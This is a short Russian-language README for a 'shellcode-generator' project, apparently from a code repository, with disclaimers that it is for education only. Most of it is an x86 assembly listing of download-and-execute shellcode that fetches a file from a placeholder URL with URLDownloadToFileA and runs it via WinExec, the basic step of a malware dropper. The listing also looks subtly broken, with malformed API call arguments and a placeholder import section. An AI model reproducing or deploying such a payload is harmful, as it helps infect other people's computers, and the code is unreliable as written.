# shellcode-generator

Программа генерирует шеллкод (машинные инструкции) и выводит их на экран.
Данный шеллкод загружает файл по ссылке и запускает его.

Программу запрещается использовать в противоправных целях. Она реализована в целях обучения.
В данной программу нет реального выполнения шеллкода. Выполнение шеллкода остается на усмотрение того, кто использует программу.
Обращаю внимание, что использование программы может быть запрещено местным законодательством вашей страны, а так же нарушать этические нормы и правила общества.

    section .text
    global _start
    
    _start:
    ; Инициализация библиотеки URLMON.dll
    push offset urlmon_dll
    call LoadLibraryA

    ; Загрузка файла по ссылке
    push 0
    push offset url
    push offset file_path
    call URLDownloadToFileA

    ; Загрузка библиотеки kernel32.dll
    push offset kernel32_dll
    call LoadLibraryA

    ; Получение адреса функции WinExec
    push offset win_exec
    push eax
    call GetProcAddress

    ; Запуск загруженного файла
    push offset file_path
    call eax

    ; Выход
    push 0
    call ExitProcess

    section .data
    urlmon_dll db 'urlmon.dll', 0
    kernel32_dll db 'kernel32.dll', 0
    url db 'http://example.com/file.exe', 0
    file_path db 'C:\path\to\save\file.exe', 0
    win_exec db 'WinExec', 0
    
    section .idata
    dd 0,0,0,0,0
    URLDownloadToFileA dd 0, 0, 0, 0
    LoadLibraryA dd 0, 0, 0, 0
    GetProcAddress dd 0, 0, 0, 0
    ExitProcess dd 0, 0, 0, 0
